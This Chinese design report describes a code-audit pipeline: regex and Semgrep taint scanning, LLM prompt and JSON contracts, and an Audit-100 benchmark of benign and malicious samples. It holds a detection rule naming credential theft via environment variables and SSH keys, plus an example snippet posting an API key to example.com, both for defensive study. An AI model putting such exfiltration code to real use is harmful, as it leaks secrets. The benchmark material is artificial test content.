TAA 代码审计设计报告

离线本地推理 LLM 失败必须显式 默认 fail-closed 可回放 可评测
目标

让审计结果可解释、可追踪、可复现，并且在 LLM 不可用或不确定时不默认放行。

范围

聚焦现有 TAA 审计流水线、训练报告投影和 benchmark 设计，不另起新系统，只补齐治理层与评测层。

依据

结合 `qwen-audit-implementation-design.md`、`audit-rules-design.md`、`audit-prompt-matrix.md`、`audit-evaluation-results-template.md` 与 `audit-eval-iteration-log.md` 的已有结论。

1. 设计框架

本节描述 TAA 代码审计的分层框架，以及各层之间的输入、输出和职责分配。图中实线表示现有框架，下方虚线带表示最终完整框架中待补的检索增强与结构化表示增强。

2. 静态规则与扫描窗口

静态扫描不是模糊的“找可疑代码”，而是一个可枚举的规则表。当前 analyzer 只扫描 Python 文件，跳过注释行、隐藏目录和 `__pycache__`，每条命中都会带出固定大小的上下文窗口。

扫描范围

扫描什么，不扫描什么

  • 只遍历以 `.py` 结尾的文件。
  • 递归进入普通子目录，但跳过以 `.` 开头的目录和 `__pycache__`。
  • 如果一行以 `#` 或 `//` 开头，直接跳过，不做规则匹配。
  • 规则命中后只取当前行对应的上下文，不回头做跨文件图搜索。
上下文窗口

邻近行到底是多少行

  • 当前实现固定取触发行前 3 行 和后 3 行。
  • 窗口公式等价于：start = max(0, i-3)，end = min(len(lines), i+4)。
  • 返回给 LLM 的 context_before 不含当前行，context_after 也不含当前行。
  • 也就是说，LLM 看到的是“前 3 行 + 触发行 + 后 3 行”，共最多 7 行。

🎯

进阶演进：引入 Semgrep 深度语义与污点扫描引擎

从单行文本正则匹配升级为 AST 语法树结构化分析与数据流追踪
架构升级提案 · AST & 污点分析

当前静态扫描基于纯文本与正则匹配（Regex Scanner），具备极低延迟（<10ms）与零外部依赖的天然优势；但在面临攻击者采用模块导入重命名（Alias Evasion）、动态反射加载与跨行数据传递时存在检测盲区。 将 Semgrep 引入 TAA 静态扫描层，能够基于抽象语法树（AST）建立语义模式匹配与端到端污点追踪（Taint Tracking），使第一道防线从“单行关键词粗筛”跃升为“结构化攻击链路预判”。

⚠️ 现状：纯文本 / 正则扫描 (Regex Baseline) 当前引擎
  • 匹配粒度：基于单行文本字符串或基础正则，逐行无状态扫描。
  • 别名逃逸盲区：无法感知 import socket as s; s.connect() 或 getattr(os, "system") 等别名重命名。
  • 数据流盲区：无法判断变量取值来源，无法追踪 key = os.getenv(); requests.post(key) 的跨行传递。
  • 证据颗粒：仅能机械切取触发行前后固定的 3 行物理代码作为局部上下文。
🚀 增强：Semgrep AST 语义与污点引擎 (Semgrep Enhanced) 引入后提升
  • 匹配粒度：基于抽象语法树（AST）节点匹配，天然理解 Python 语言结构与作用域。
  • 语法归一化：无论函数如何起别名、引用重命名，AST 层面全部归一化为统一调用签名。
  • 跨行污点追踪：支持 pattern-sources → pattern-sinks，完整追踪敏感数据从读取到外发的全链路。
  • 结构化证据链：输出清晰的数据流流动节点清单（Taint Path），直接向 LLM 提供高信度事实证据。
🛡️ 1. 消除别名与混淆逃逸

基于语法树符号解析，即便攻击代码采用 import urllib.request as u、from os import system as cmd 或将敏感库解构重命名，Semgrep 均能穿透混淆并准确捕获调用点。

🧬 2. 跨行污点渗漏追踪 (Taint)

将“凭证读取”（Source，如 os.environ、.ssh）与“网络外发”（Sink，如 requests.post、socket.send）关联。只要变量产生数据流交叉即触发污点告警，识别真正的外发通道。

🎯 3. 压降 40%~60% 语法误报

利用 pattern-not-inside 语法排除测试框架（如 pytest/unittest 中的 mock 调用）与绘图指标上报代码，在进入大模型前滤除无效噪点，大幅节省 TEE 容器内推理算力。

🤖 4. 赋能 LLM 结构化证据链

打破传统 7 行固定上下文的割裂限制，将 Semgrep 计算出的污点流动跃迁行号与调用链直接注入 Finding Prompt，让大模型免于在冗余代码中盲目搜索，使研判准确度呈代际提升。

📋 框架适配示例：TAA 敏感凭证跨行外传污点规则 (Semgrep Taint Rule Spec)
# Semgrep 污点分析规则：捕获敏感凭据提取并经由网络外发 rules: - id: taa-secret-exfiltration-taint languages: [python] severity: ERROR message: "检测到系统敏感环境变量或私钥凭证通过网络信道被外发传出" mode: taint pattern-sources: - pattern: os.environ[...] - pattern: os.getenv(...) - pattern: open(..., ".ssh/id_rsa").read() pattern-sinks: - pattern: requests.post(..., data=$VAR, ...) - pattern: requests.get(..., params=$VAR, ...) - pattern: socket.socket().sendall(...) pattern-not-inside: - pattern: | def test_...(...): ...
设计判断：静态扫描的职责不是“判断有没有恶意”，而是“把值得判断的代码段精确送进 LLM”。所以规则必须宽，但证据必须窄；命中可以多，但上下文一定要短、准、可解释。

3. LLM 输入与返回契约

命中规则后，送给 LLM 的不是整文件，而是一个明确的 finding prompt 或 file prompt。二者用途不同：前者用于单点语义确认，后者用于文件级攻击链判断。

Finding 级

传给 LLM 的字段

  • file：完整路径。
  • line：触发规则的行号。
  • rule_id、category、description：规则语义。
  • context_before：触发行前 3 行。
  • code_snippet：触发行本身。
  • context_after：触发行后 3 行。
你是一个代码安全审计专家。请分析以下代码片段是否存在窃取数据、外传数据或其他恶意行为。 ## 代码片段 文件: /path/to/sample.py (第 42 行) ```python import os import requests api_key = os.getenv("API_KEY") >>> requests.post("https://example.com/upload", json={"key": api_key}) print("done") ``` ## 触发的规则 规则ID: NET_001 类别: 网络请求 严重度: HIGH 规则说明: 检测显式 HTTP/HTTPS 传输点，用于识别外传或远端控制。 ## 请回答 1. verdict: MALICIOUS(恶意) / SUSPICIOUS(可疑) / BENIGN(正常) / UNCERTAIN(不确定) 2. reason: 一句话说明理由（中文） 3. risk: 如果恶意，数据会怎样被利用 请严格按以下 JSON 格式回答，不要包含其他内容: {"verdict":"...","reason":"...","risk":"..."}
File 级

传给 LLM 的字段

  • file：文件 basename，不再需要完整路径。
  • line_count：文件总行数。
  • findings_count：静态命中数。
  • findings_summary：去重后的规则摘要，格式如 CMD_001(命令执行,HIGH)。
  • full_code：最多前 80 行源码；超过后追加截断说明。
文件: sample.py (123 行) 发现 4 个可疑点: CMD_001(命令执行,HIGH), EXF_001(数据外传,HIGH) ```python 前 80 行代码 # ... (截断，文件超过 80 行) ``` 严格按 JSON 回答: {"risk_level":"HIGH|MEDIUM|LOW|UNCERTAIN","summary":"一句话安全结论","chained":true,"exfiltration":true}

输出规则

返回什么，失败时怎么办

  • Finding 级必须返回 verdict / reason / risk。
  • File 级必须返回 risk_level / summary / chained / exfiltration。
  • 后端缺失时，直接返回 UNCERTAIN，理由写“未配置推理后端”。
  • 模型返回无法解析时，继续返回 UNCERTAIN，理由保留原始错误。

解析策略

只接 JSON，不接散文

  • 调用侧把温度固定到 0.1，减少漂移。
  • 返回文本只做一次 JSON 提取，不做多轮猜测。
  • 提取失败即转 UNCERTAIN，不允许“猜一个像样的标签”。
  • 这就是 fail-closed 的具体实现：失败状态必须进入结果，而不是消失。

4. Benchmark 评测基准设计 (Audit-100)

评估代码安全审计引擎的核心挑战在于平衡误报率（False Positive Rate, FPR）与漏报率（False Negative Rate, FNR）。若规则过于宽泛，常规的超参数读取或指标上报会被粗暴阻断，破坏正常训练；若规则过于保守或缺乏语义理解，攻击者通过简单重命名、反射调用或编码混淆即可实现逃逸。为此，我们构建了标准化的 audit-100 Benchmark，提供可量化、可复现的动静协同审计评测基准。

🎯

基准全景：100 样本 / 10 细分家族 / 50:50 对称样本集

评测集基于 3 个真实开源 AI 项目（LogisticRegression、TEE-test、Retina-DKD）作为源码基座，严格派生出 100 个具备独立执行沙箱的代码样本。 样本集按 50 个良性误报探针（Benign FP Probes） 与 50 个恶意攻击载荷（Malicious Attack Samples） 对称分布， 用于精准测试“静态宽规则召回”与“大模型语义二次仲裁”在实际工程代码中的协同表现。

🛡️ 50 组良性探针样本（误报抑制与语义豁免测试） 预期决策：放行 (PASS)

构造原理：覆盖算法工程中的合法操作，但这批代码在语法特征上极易触发宽召回静态正则（如文件 I/O 读参、环境目录获取、指标标准输出、模型结构序列化落盘等）。

评测重点：检验 LLM 能否结合上下文理解业务真实意图，准确排除语法假阳性（False Positive）。若审计引擎草率将正常操作判定为高危并阻断，则记为误报缺陷。

🚨 50 组恶意攻击样本（威胁捕获与载荷识别测试） 预期决策：阻断 (BLOCK)

构造原理：覆盖真实的攻防对抗向量，包括操作系统子进程命令派生、敏感凭据窥探、反弹 Socket/HTTP 外联通信、Base64/Pickle 混淆载荷以及系统级持久化驻留。

评测重点：检验第一道静态规则能否有效兜底捕获异常指纹，并检验 LLM 能否穿透代码混淆识破攻击链并输出高危告警。若有任何样本逃逸被放行，则记为漏报事故。

🧩 10 维代码变体家族矩阵（5 良性 B1~B5 + 5 恶意 M1~M5）

评测集将 100 个样本结构化归类为 10 个特定代码家族（Family），每个家族各包含 10 个同类变体样本。此举消除了黑盒测试中的归因模糊性，任何指标波动均能精确定位至具体的语义对抗维度：

B1 等价语法重构 (Pure Refactor)
良性基线 (10样本)

函数拆分、变量重命名、import 路径重组与目录重构。验证静态与大模型对“代码形态改变但控制流等价”的代码保持稳定性，不产生无意义告警。

预期命中规则：无 预期裁决：BENIGN (放行)
B2 诊断日志与状态打点 (Safe Logging)
良性基线 (10样本)

标准输出模型训练 Loss、准确率指标、Step 计数与进度打点。验证审计器能够准确区分常规指标打印与敏感数据（如 Token/密码）打印泄露。

触发观察：EMB_003 预期裁决：BENIGN (放行)
B3 配置解析与数据流封装 (Config Wrapping)
良性基线 (10样本)

封装读取本地超参数 JSON/YAML，读取 DATA_DIR 等非敏感运行环境变量。测试系统对“普通业务配置读取”与“敏感凭证窃取”的语义区分能力。

触发观察：FIL_001, ENV_001 预期裁决：BENIGN (放行)
B4 指标导出与状态序列化 (Artifact Export)
良性基线 (10样本)

将评估结果写成 CSV/PNG、使用序列化保存模型检查点（Checkpoints）。测试审计器能否将常规文件 I/O 与恶意数据窃取、反序列化攻击解耦。

触发观察：EMB_001, EMB_002 预期裁决：BENIGN (放行)
B5 适配层封装与 CLI 重构 (Wrapper & Entrypoint)
良性基线 (10样本)

重构主训练脚本的入口调用逻辑，增加 CLI 参数解析与流程包装。测试复杂的模块封装层是否会被静态规则误判为多级调用链风险。

预期命中规则：无 预期裁决：BENIGN (放行)
M1 系统子进程命令执行 (Command Injection)
高危攻击 (10样本)

调用 subprocess.Popen、os.system 等派生 OS 底层 Shell，执行任意系统命令，测试容器沙箱逃逸防御与进程派生检测能力。

基线拦截规则：CMD_001 预期裁决：MALICIOUS (阻断)
M2 网络隐蔽信道外传 (Network Exfiltration)
高危攻击 (10样本)

使用 requests.post、urllib 或原生 socket 建立外联通信，向远端 C2 服务器回传内网环境或模型资产数据。

基线拦截规则：NET_001, NET_002 预期裁决：MALICIOUS (阻断)
M3 敏感凭证与密钥探测 (Credential Theft)
中危攻击 (10样本)

针对性窥探容器内 .env 文件、宿主 id_rsa 私钥，或遍历环境变量窃取云厂商 API Token、数据库连接串。

基线拦截规则：FIL_001, ENV_001 预期裁决：MALICIOUS (阻断)
M4 混淆编码与隐藏载荷 (Obfuscation & Packing)
高危攻击 (10样本)

利用多层嵌套 Base64 编码、Zlib 压缩或借助 Pickle/Marshal 反序列化逃避静态语法检测，在运行时动态还原并释放恶意载荷。

基线拦截规则：OBF_001, EXF_001 预期裁决：MALICIOUS (阻断)
M5 复合攻击链与持久化后门 (Persistence & Chaining)
高危攻击 (10样本)

跨文件编排攻击向量：提取敏感变量 → 序列化打包 → 网络隐蔽外发 → 向 .bashrc 写入定时任务常驻，测试跨文件全局攻击链判定。

基线拦截规则：PER_001, EXF_001 预期裁决：MALICIOUS (阻断)

🔬 源项目隔离架构：消除数据集先验偏置 (Source Isolation)

在 LLM 安全评测中，若良性与恶意样本源自同一工程，模型极易由于上下文先验偏置（Contextual Bias）产生虚假泛化：例如仅凭该项目的特定模块名、作者注释或编码风格即可推断标签，而无需真正理解代码执行语义。为此我们严格实施源项目隔离（Source Isolation）：

良性样本基座 (50 样本)

LogisticRegression (25) + TEE-test (25)

涵盖经典线性分类模型与底层 TEE 测试桩。代码符合业界标准算法实践，包含规范的类封装与评估流水线，作为合法业务基准。

恶意样本基座 (50 样本)

Retina-DKD 深度学习医学影像项目 (50)

基于复杂的 ResNet 图像处理模型，在真实深度学习训练流程中植入隐蔽的攻击载荷，作为高危对抗基准。

💡 工程收益：彻底切断了审计器根据“项目名/固定函数名”猜测结论的投机途径，迫使静态规则与 LLM 必须严格基于 AST 节点、数据流流动路径与调用语义做出判定。

🔄 评测生命周期：全自动化度量与双轨验证

1
样本实体化 (Materialize)

执行脚本基于基座项目复制并应用变体规则，生成 100 个独立目录，注入 sample.json 标定 Ground Truth 标签。

2
静态规则初筛 (Static Baseline)

以快速正则/AST 扫描代码库，捕获可疑代码行生成 List[Finding]。在纯静态模式下直接聚合统计输出基线阻断决策。

3
LLM 双级语义裁决 (Semantic Audit)

向本地 Qwen 提交 Finding 级 Prompt（过滤行级误报）与 File 级 Prompt（宏观攻击链判定），输出结构化决策。

4
度量指标生成 (Metrics Aggregation)

对比预测结果与标定真值，自动计算 Accuracy、Precision、Recall、F1-Score 及 Fail-Closed 容灾率，导出四联报告。

# 1. 自动化固化生成 100 个标准测试沙箱（幂等初始化） python3 tools/generate_benchmark_samples.py --clean # 2. 执行第一轮：纯静态基线评测（用于度量纯规则扫描的原始召回率与误报水平） python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --llm-backend none # 3. 执行第二轮：动静协同评测（引入本地 Ollama 模型，度量语义纠偏与攻击链推导收益） python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --llm-backend ollama --llm-model qwen2.5-coder:0.5b
为什么必须实施动静双轨对比？ 纯静态扫描具备“高召回率（不漏报）但高误报率”的特点；引入本地 LLM 的核心价值在于利用语义理解“压降误报（豁免合规操作）并串联攻击链”。只有通过严格的双轨对比，才能真实量化大模型为审计体系带来的增量价值（ROI）。

Fail-Closed 兜底拦截 (M4-07) UNCERTAIN → 阻断

现象：攻击样本采用多层 base64 + __import__ 反射混淆，小参数模型因缺乏动态解构能力输出 UNCERTAIN。

评测结论与设计落地：Audit-100 实测结果表明，TAA 动静两阶段协同审计架构具备扎实的工程可行性：静态规则层负责“防漏”（保证 86%+ 召回并滤除 50% 纯净代码），LLM 语义层负责“降噪”（压降 27.3% 误报），Fail-Closed 负责“托底”（杜绝模型故障或歧义导致漏判）。这套动静平衡机制在严苛保护 TEE 机密计算安全的同时，最大化保障了生产业务的平稳放行。

6. 设计依据

下面这些文档与实际 benchmark 输出共同构成当前设计的依据。它们说明系统已经具备什么、在哪些地方暴露出问题、以及为什么要采用现在这套补强方式。

`qwen-audit-implementation-design.md`

确认当前实现已经是三层聚合：静态扫描负责召回，LLM 负责语义判断，聚合逻辑负责输出最终结论。它支持本设计保留五段式闭环，而不是重做架构。

`audit-rules-design.md`

说明静态层本质是规则召回，并且已经在处理框架误报。这支持本设计把 stage 1 定位为“候选筛选器”，而不是最终裁决器。

`audit-prompt-matrix.md`

指出 prompt 仍存在 JSON 解析脆弱、判定步骤不够明确、`UNCERTAIN` 规则不足、benign trap 需要显式豁免等问题。这直接支持本设计把 prompt 约束和人工复核边界写进架构。

`audit-evaluation-results-template.md`

要求结果记录 `rule_set_version`、`prompt_version`、`auditor_version`、`llm_state`、`fail_closed_count` 等字段，也要求分层统计与错误类型分类。这支持本设计把版本和失效状态作为一等字段，而不是附注。

`audit-eval-iteration-log.md`

记录了 `llm_unavailable`、`parse_error`、静态基线、来源混杂、版本漂移等真实问题。它说明设计必须面向“失败可见”和“回放可追踪”，不能把系统当成一条永远成功的理想链路。

`audit-research.md`

强调审计器和被审计对象要分离，且高可靠审计应记录 `auditor_model`、`rule_set_version`、`prompt_version`、`llm_state` 和 `fail_closed`。这构成了本设计的总原则：可解释性、可复现性和保守失败优先。
